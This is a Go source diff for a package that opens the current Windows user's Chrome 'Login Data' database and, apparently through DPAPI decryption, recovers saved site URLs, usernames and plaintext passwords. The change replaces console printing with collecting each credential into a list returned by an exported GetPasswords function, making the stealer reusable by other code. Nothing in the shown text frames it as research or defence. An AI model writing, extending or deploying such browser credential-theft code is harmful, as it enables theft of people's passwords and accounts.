@@ -3,13 +3,11 @@ package chrome
 
 import (
 	"database/sql"
-	"fmt"
 	"io"
 	"log"
 	"os"
 	"syscall"
 	"unsafe"
-
 	_ "github.com/mattn/go-sqlite3"
 )
 
@@ -22,6 +20,13 @@ var (
 
 	dataPath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
 )
+	var credentials []credential
+
+type credential struct{
+	Url string
+	Login string
+	Password string
+}
 
 type DATA_BLOB struct {
 	cbData uint32
@@ -102,7 +107,7 @@ func checkFileExist(filePath string) bool {
 	}
 }
 
-func getPasswords() {
+func GetPasswords() ([]credential){
 	//Check for Login Data file
 	if !checkFileExist(dataPath) {
 		os.Exit(0)
@@ -144,12 +149,25 @@ func getPasswords() {
 		}
 		//Check if no value, if none skip
 		if URL != "" && USERNAME != "" && string(pass) != "" {
-			fmt.Println(URL, USERNAME, string(pass))
+			cred := new(credential)
+			cred.Url = URL
+			cred.Login = USERNAME
+			cred.Password = string(pass)
+			credentials = append(credentials, *cred)
+
+			//byte, _:= json.Marshal(cred)
+
+			//fmt.Println(URL, USERNAME, string(pass))
 		}
 	}
+	//fmt.Printf("%v", credentials)
+
 	err = rows.Err()
 	if err != nil {
 		log.Fatal(err)
 	}
+	//fmt.Printf("%v",credentials)
+
+	return credentials
 
 }
